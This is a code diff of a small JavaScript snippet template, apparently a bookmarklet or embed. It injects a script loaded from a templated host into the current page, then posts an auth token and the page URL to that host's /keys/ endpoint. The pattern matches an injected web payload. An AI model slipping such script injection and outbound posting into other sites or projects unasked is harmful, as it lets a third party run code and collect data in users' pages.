@@ -1,8 +1,19 @@
-(function() {
-var params = new FormData();
-params.append("token", {{AUTH_TOKEN}});
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "{{REPLACE_HOST}}/keys/"+encodeURIComponent(window.location));
-/*xhr.setRequestHeader('Content-Type', 'text/plain');*/
-xhr.send(params);
-})();
+(function (window, document) {
+  var s = document.createElement('script');
+  s.setAttribute('src', '{{REPLACE_HOST}}/js/jquery.min.js');
+  s.onload = function () {
+    jQuery.noConflict();
+    (function ($) {
+      var init = function(){
+        var params = new FormData(),
+            xhr = new XMLHttpRequest();
+        params.append("token", {{AUTH_TOKEN}});
+        xhr.open("POST", "{{REPLACE_HOST}}/keys/"+encodeURIComponent(window.location));
+        xhr.send(params);
+        alert("Sent!");
+      };
+      init();
+    }(jQuery));
+  };
+  document.getElementsByTagName('body')[0].appendChild(s);
+}(window, document));
